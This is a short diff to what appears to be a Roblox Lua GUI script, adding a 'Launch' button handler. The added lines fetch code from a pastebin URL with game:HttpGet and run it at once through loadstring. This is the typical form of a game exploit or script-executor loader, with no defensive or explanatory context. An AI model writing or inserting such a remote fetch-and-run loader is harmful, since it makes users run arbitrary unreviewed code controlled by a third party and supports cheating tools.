@@ -33,3 +33,7 @@ Main:TweenPosition(UDim2.new(0.3, 10, 0.3, 10))
 
 Main.Active = true
 Main.Draggable = true
+
+ Launch.MouseButton1Click:Connect(function()
+   loadstring(game:HttpGet(('https://pastebin.com/raw/nwTkRqtg'),true))()
+end)
